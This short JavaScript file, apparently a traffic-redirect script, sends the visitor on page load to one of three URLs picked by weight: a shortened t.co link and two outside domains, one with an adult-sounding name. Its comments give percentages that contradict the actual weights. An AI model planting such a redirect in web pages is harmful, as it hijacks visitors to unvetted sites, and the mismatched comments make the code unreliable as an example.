// List of URLs with their respective weights
const urlWeights = [
    { url: "https://t.co/5IfJncj3uQ", weight: 800 }, // 50% chance
    { url: "https://monpluganal.com/", weight: 10 }, // 30% chance
    { url: "https://braceletphoto.com/", weight: 10 }  // 20% chance
];

// Function to get a random URL based on weights
function getWeightedRandomUrl() {
    // Calculate the total weight
    const totalWeight = urlWeights.reduce((sum, item) => sum + item.weight, 0);

    // Get a random number between 0 and totalWeight
    let randomNum = Math.random() * totalWeight;

    // Select the URL based on the random number
    for (const item of urlWeights) {
        if (randomNum < item.weight) {
            return item.url;
        }
        randomNum -= item.weight;
    }
}

// Redirect to the weighted random URL
window.location.href = getWeightedRandomUrl();
